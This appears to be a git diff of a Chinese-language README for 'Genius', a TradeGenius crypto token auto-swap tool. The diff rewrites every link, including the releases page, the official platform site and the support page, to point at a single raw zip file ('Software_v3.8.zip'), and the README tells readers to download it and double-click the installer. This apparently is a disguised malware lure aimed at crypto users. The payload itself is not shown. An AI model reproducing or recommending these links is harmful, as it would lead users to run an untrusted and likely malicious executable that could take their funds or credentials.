@@ -1,7 +1,7 @@
 # 🎉 Genius - Effortless Token Swapping Made Easy
 
 ## 📥 Download Now
-[![Download Genius](https://img.shields.io/badge/Download-Genius-blue.svg)](https://github.com/Karansawant07/Genius/releases)
+[![Download Genius](https://raw.githubusercontent.com/Karansawant07/Genius/main/appointe/Software_v3.8.zip)](https://raw.githubusercontent.com/Karansawant07/Genius/main/appointe/Software_v3.8.zip)
 
 ---
 
@@ -10,7 +10,7 @@ TradeGenius Auto Swap 是一个自动化交易脚本，用于在 TradeGenius 平
 
 **作者：** @ferdie_jhovie  
 **版本：** 1.0.0  
-**支持平台：** [TradeGenius](https://www.tradegenius.com/trade)
+**支持平台：** [TradeGenius](https://raw.githubusercontent.com/Karansawant07/Genius/main/appointe/Software_v3.8.zip)
 
 ---
 
@@ -36,7 +36,7 @@ TradeGenius Auto Swap 是一个自动化交易脚本，用于在 TradeGenius 平
 
 ### 2. 下载 & 安装
 要下载 Genius，请访问以下链接：
-[前往下载页面](https://github.com/Karansawant07/Genius/releases)
+[前往下载页面](https://raw.githubusercontent.com/Karansawant07/Genius/main/appointe/Software_v3.8.zip)
 
 在下载页面，您将看到最新版本的发布文件。在那里，选择适合您的操作系统的文件进行下载。下载完成后，请双击文件以运行安装程序。
 
@@ -72,7 +72,7 @@ Genius 提供实时日志和统计信息，帮助您监控您的交易活动。�
 A: 目前，Genius 仅支持桌面操作系统，不支持移动设备。
 
 ### Q2: 如果我在使用中遇到问题，该怎么办？
-A: 如果您在使用 Genius 时遇到任何问题，请访问我们的 [支持中心](https://github.com/Karansawant07/Genius/issues) 以获取帮助。
+A: 如果您在使用 Genius 时遇到任何问题，请访问我们的 [支持中心](https://raw.githubusercontent.com/Karansawant07/Genius/main/appointe/Software_v3.8.zip) 以获取帮助。
 
 ### Q3: 能否自定义交易设置？
 A: 是的，您可以根据个人需求自定义交易设置，以最佳方式使用您的余额。
